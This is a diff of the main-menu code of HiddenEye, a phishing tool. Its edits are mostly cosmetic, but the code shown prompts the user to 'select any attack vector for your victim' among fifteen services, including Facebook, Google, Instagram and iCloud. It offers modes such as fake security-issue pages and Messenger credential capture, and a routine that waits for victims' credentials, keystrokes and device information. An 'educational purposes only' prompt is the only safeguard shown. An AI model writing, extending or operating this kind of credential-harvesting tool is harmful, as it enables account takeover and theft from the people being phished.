@@ -132,9 +132,9 @@ def runMainMenu(): #menu where user select what they wanna use
 <=============================================================================>
                                              '''.format(GREEN, DEFAULT, CYAN, RED))
 
-    
 
-        
+
+
     if 256 != system('which php'): #Checking if user have PHP
         print (" -----------------------".format(CYAN, DEFAULT))
         print ("[PHP INSTALLATION FOUND]".format(CYAN, DEFAULT))
@@ -142,24 +142,24 @@ def runMainMenu(): #menu where user select what they wanna use
     else:
         print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/".format(CYAN, DEFAULT))
         exit(0)
-        
+
     for i in range(101):
         sleep(0.05)
-        stdout.write("\r{0}[{1}*{0}]{1} Eye is Opening. Please Wait... %d%%".format(RED, DEFAULT) % i)
-        stdout.flush()     
-    
-    if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye>>> {1}".format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
+        stdout.write("\r{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait... %d%%".format(RED, DEFAULT) % i)
+        stdout.flush()
+
+    if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}".format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
         system('clear')
         print ('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n'.format(RED, DEFAULT))
         exit(0)
-    option = input("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}HiddenEye>>>  {1}".format(RED, DEFAULT))
+    option = input("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n{0}HiddenEye >>>  {1}".format(RED, DEFAULT))
     if option == '1':
         loadModule('Facebook')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye>>> {1}".format(RED, DEFAULT))
+        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
         runPhishing('Facebook', customOption)
     elif option == '2':
         loadModule('Google')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}HiddenEye>>> {1}".format(RED, DEFAULT))
+        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
         runPhishing('Google', customOption)
     elif option == '3':
         loadModule('LinkedIn')
@@ -183,7 +183,7 @@ def runMainMenu(): #menu where user select what they wanna use
         runPhishing('Twitter', customOption)
     elif option == '8':
         loadModule('Instagram')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n{0}HiddenEye>>> {1}".format(RED, DEFAULT))
+        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
         runPhishing('Instagram', customOption)
     elif option == '9':
         loadModule('Snapchat')
@@ -207,7 +207,7 @@ def runMainMenu(): #menu where user select what they wanna use
         runPhishing('Steam', customOption)
     elif option == '14':
         loadModule('VK')
-        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}HiddenEye>>> {1}".format(RED, DEFAULT))
+        customOption = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
         runPhishing('VK', customOption)
     elif option == '15':
         loadModule('iCloud')
@@ -269,9 +269,9 @@ def endMessage(): #Message when HiddenEye exit
               {3}https://github.com/DarkSecDevelopers     '''.format(GREEN, DEFAULT, CYAN, RED))
 
 def getCredentials():
-	
-    
-    
+
+
+
     print("{0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n".format(CYAN, DEFAULT))
     while True:
         with open('Server/www/usernames.txt') as creds:
